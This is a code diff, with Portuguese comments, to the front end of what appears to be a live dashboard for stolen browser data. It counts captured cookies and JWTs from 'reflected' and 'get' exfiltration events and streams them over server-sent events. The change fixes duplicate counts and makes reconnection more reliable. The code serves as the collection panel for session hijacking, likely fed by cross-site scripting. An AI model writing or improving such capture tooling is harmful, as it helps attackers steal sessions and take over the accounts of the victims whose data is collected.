@@ -159,8 +159,9 @@ function updateStats() {
 
 function countCapture(c) {
   state.total++;
-  if (c.type === 'cookie' || c.data) state.cookies++;
-  if (c.jwt || c.type === 'jwt')      state.jwts++;
+  // conta como cookie apenas tipos que exfiltram sessão, não todo capture com c.data
+  if (['cookie', 'reflected', 'get'].includes(c.type)) state.cookies++;
+  if (c.jwt || c.type === 'jwt') state.jwts++;
   state.lastTs = c.timestamp;
 }
 
@@ -200,38 +201,56 @@ function animateFlow() {
 }
 
 // ── SSE ────────────────────────────────────────────────────────────────────
+let esInstance = null;
+
 function connectSSE() {
+  if (esInstance) { esInstance.close(); esInstance = null; }
+
   const es = new EventSource('/events');
+  esInstance = es;
 
-  es.addEventListener('init', e => {
-    const captures = JSON.parse(e.data);
-    captures.forEach(c => {
-      countCapture(c);
-      addCapture(c, false);
-    });
-    updateStats();
-    elStatus.textContent = 'Conectado';
-    elPulse.style.background = 'var(--green)';
-  });
+  es.onopen = () => setConnected(true);
 
-  es.addEventListener('capture', e => {
-    const c = JSON.parse(e.data);
-    countCapture(c);
-    addCapture(c, true);
-    updateStats();
-  });
+  // Todos os eventos chegam via onmessage com campo "event" no JSON
+  es.onmessage = e => {
+    let msg;
+    try { msg = JSON.parse(e.data); } catch { return; }
 
-  es.addEventListener('clear', () => clearFeed());
+    if (msg.event === 'init') {
+      // Reset completo — evita duplicação em reconexões
+      state.total = 0; state.cookies = 0; state.jwts = 0; state.lastTs = null;
+      elList.innerHTML = '';
+      elList.appendChild(elEmpty);
+      elEmpty.style.display = 'block';
+
+      const existing = Array.isArray(msg.data) ? msg.data : [];
+      if (existing.length > 0) elEmpty.style.display = 'none';
+      existing.forEach(c => { countCapture(c); addCapture(c, false); });
+      updateStats();
+      setConnected(true);
+
+    } else if (msg.event === 'capture') {
+      countCapture(msg.data);
+      addCapture(msg.data, true);
+      updateStats();
+
+    } else if (msg.event === 'clear') {
+      clearFeed();
+    }
+  };
 
   es.onerror = () => {
-    elStatus.textContent = 'Reconectando...';
-    elPulse.style.background = 'var(--red)';
+    setConnected(false);
+    if (es.readyState === EventSource.CLOSED) {
+      esInstance = null;
+      setTimeout(connectSSE, 3000);
+    }
   };
+}
 
-  es.onopen = () => {
-    elStatus.textContent = 'Conectado';
-    elPulse.style.background = 'var(--green)';
-  };
+function setConnected(ok) {
+  elStatus.textContent = ok ? 'Conectado' : 'Reconectando...';
+  elPulse.style.background = ok ? 'var(--green)' : 'var(--orange)';
 }
 
 // ── Atualiza "última captura" a cada 10s ──────────────────────────────────
